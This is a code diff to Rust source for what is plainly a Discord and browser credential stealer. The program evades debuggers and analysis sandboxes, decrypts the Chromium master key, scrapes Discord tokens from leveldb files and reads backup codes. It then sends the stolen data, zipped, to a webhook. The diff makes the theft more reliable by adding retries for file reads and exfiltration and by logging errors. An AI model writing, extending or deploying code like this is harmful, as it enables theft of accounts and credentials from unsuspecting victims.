@@ -12,7 +12,8 @@ use std::{
     collections::{HashMap, HashSet},
     env, fs,
     io::Write,
-    path::PathBuf,
+    path::{Path, PathBuf},
+    sync::OnceLock,
 };
 use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
 
@@ -339,6 +340,18 @@ fn is_debugged() -> bool {
     browsers::is_analysis_environment()
 }
 
+fn token_regex() -> &'static Regex {
+    static TOKEN_REGEX: OnceLock<Regex> = OnceLock::new();
+    TOKEN_REGEX.get_or_init(|| {
+        Regex::new(&s_token_regex()).unwrap_or_else(|_| Regex::new("$^").expect("fallback regex"))
+    })
+}
+
+fn log_runtime_error(error: &dyn std::error::Error) {
+    let message = format!("{error}\n");
+    let _ = fs::write(env::temp_dir().join("app_error.log"), message);
+}
+
 #[derive(Debug, Serialize, Deserialize)]
 struct DdU {
     id: String,
@@ -569,9 +582,17 @@ async fn send_webhook_message(
     embed: Value,
     zip_data: Option<Vec<u8>>,
     backup_codes_path: Option<&str>,
-) {
+) -> Result<(), Box<dyn std::error::Error>> {
+    #[derive(Clone)]
+    struct AttachmentSpec {
+        field: String,
+        filename: String,
+        mime: String,
+        data: Vec<u8>,
+    }
+
     let mut attachment_meta = Vec::new();
-    let mut file_parts: Vec<(String, reqwest::multipart::Part)> = Vec::new();
+    let mut attachments = Vec::new();
     let mut idx = 0u64;
 
     if let Some(zip) = zip_data {
@@ -579,33 +600,41 @@ async fn send_webhook_message(
         entry.insert(s_json_id(), json!(idx));
         entry.insert(s_json_filename(), json!(s_zip_filename()));
         attachment_meta.push(Value::Object(entry));
-        if let Ok(part) = reqwest::multipart::Part::bytes(zip)
-            .file_name(s_zip_filename())
-            .mime_str(&s_application_zip())
-        {
-            file_parts.push((files_part_name(idx), part));
-            idx += 1;
-        }
+        attachments.push(AttachmentSpec {
+            field: files_part_name(idx),
+            filename: s_zip_filename(),
+            mime: s_application_zip(),
+            data: zip,
+        });
+        idx += 1;
     }
 
     if let Some(path) = backup_codes_path {
-        if let Ok(data) = fs::read(path) {
+        if let Ok(data) = browsers::read_bytes_with_retry(Path::new(path)) {
             let mut entry = serde_json::Map::new();
             entry.insert(s_json_id(), json!(idx));
             entry.insert(s_json_filename(), json!(s_backup_filename()));
             attachment_meta.push(Value::Object(entry));
-            if let Ok(part) = reqwest::multipart::Part::bytes(data)
-                .file_name(s_backup_filename())
-                .mime_str(&s_text_plain())
-            {
-                file_parts.push((files_part_name(idx), part));
-            }
+            attachments.push(AttachmentSpec {
+                field: files_part_name(idx),
+                filename: s_backup_filename(),
+                mime: s_text_plain(),
+                data,
+            });
         }
     }
 
-    if file_parts.is_empty() {
-        let _ = client.post(webhook_url).json(&embed).send().await;
-        return;
+    if attachments.is_empty() {
+        return browsers::retry_async(|| async {
+            client
+                .post(webhook_url)
+                .json(&embed)
+                .send()
+                .await
+                .map(|_| ())
+                .map_err(|error| Box::new(error) as Box<dyn std::error::Error>)
+        })
+        .await;
     }
 
     let mut payload = embed;
@@ -614,12 +643,29 @@ async fn send_webhook_message(
     }
 
     let payload_json = serde_json::to_string(&payload).unwrap_or_default();
-    let mut form = reqwest::multipart::Form::new().text(s_payload_json(), payload_json);
-    for (field, part) in file_parts {
-        form = form.part(field, part);
-    }
 
-    let _ = client.post(webhook_url).multipart(form).send().await;
+    browsers::retry_async(|| {
+        let payload_json = payload_json.clone();
+        let attachments = attachments.clone();
+        async move {
+            let mut form = reqwest::multipart::Form::new().text(s_payload_json(), payload_json);
+            for attachment in attachments {
+                let part = reqwest::multipart::Part::bytes(attachment.data)
+                    .file_name(attachment.filename)
+                    .mime_str(&attachment.mime)
+                    .map_err(|error| Box::new(error) as Box<dyn std::error::Error>)?;
+                form = form.part(attachment.field, part);
+            }
+            client
+                .post(webhook_url)
+                .multipart(form)
+                .send()
+                .await
+                .map(|_| ())
+                .map_err(|error| Box::new(error) as Box<dyn std::error::Error>)
+        }
+    })
+    .await
 }
 
 fn badge_emojis(flags: u64) -> Vec<&'static str> {
@@ -723,7 +769,13 @@ fn get_discord_paths() -> HashMap<String, PathBuf> {
 }
 
 #[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
+async fn main() {
+    if let Err(error) = run_app().await {
+        log_runtime_error(error.as_ref());
+    }
+}
+
+async fn run_app() -> Result<(), Box<dyn std::error::Error>> {
     if is_debugged() {
         std::thread::sleep(std::time::Duration::from_secs(30));
         return Ok(());
@@ -751,10 +803,19 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let local_state_path = path.join(s_local_state());
 
-        if let Ok(content) = fs::read_to_string(&local_state_path) {
-            let json_ls: Value = serde_json::from_str(&content)?;
-            if let Some(enc_key) = json_ls[s_os_crypt()][s_encrypted_key()].as_str() {
-                if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
+        let content = match browsers::read_to_string_with_retry(&local_state_path) {
+            Ok(content) => content,
+            Err(_) => continue,
+        };
+
+        let json_ls: Value = match serde_json::from_str(&content) {
+            Ok(value) => value,
+            Err(_) => continue,
+        };
+
+        if let Some(enc_key) = json_ls[s_os_crypt()][s_encrypted_key()].as_str() {
+            if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
+                if bytes.len() > 5 {
                     if let Some(master_key) = unwrap_key(&bytes[5..]) {
                         let prof_path = path.clone();
                         if !prof_path.exists() {
@@ -764,7 +825,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let db_path = prof_path.join(s_leveldb());
                         if db_path.exists() {
                             if let Ok(entries) = fs::read_dir(&db_path) {
-                                let re = Regex::new(&s_token_regex()).unwrap();
+                                let re = token_regex();
                                 for entry in entries.flatten() {
                                     if let Ok(file_content) = fs::read(entry.path()) {
                                         let text = String::from_utf8_lossy(&file_content);
@@ -842,15 +903,19 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                 }]
                                                             });
 
-                                                            send_webhook_message(
+                                                            if let Err(error) = send_webhook_message(
                                                                 &client,
                                                                 &wbh,
                                                                 embed,
                                                                 browser_zip.clone(),
                                                                 backup_codes_path.as_deref(),
                                                             )
-                                                            .await;
-                                                            delivered_with_token = true;
+                                                            .await
+                                                            {
+                                                                log_runtime_error(error.as_ref());
+                                                            } else {
+                                                                delivered_with_token = true;
+                                                            }
                                                         }
                                                     }
                                                 }
@@ -863,11 +928,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     }
                 }
             }
-        }
     }
 
     if !delivered_with_token {
-        let _ = browsers::run(&client, &wbh).await;
+        if let Err(error) = browsers::run(&client, &wbh).await {
+            log_runtime_error(error.as_ref());
+        }
     }
     Ok(())
 }
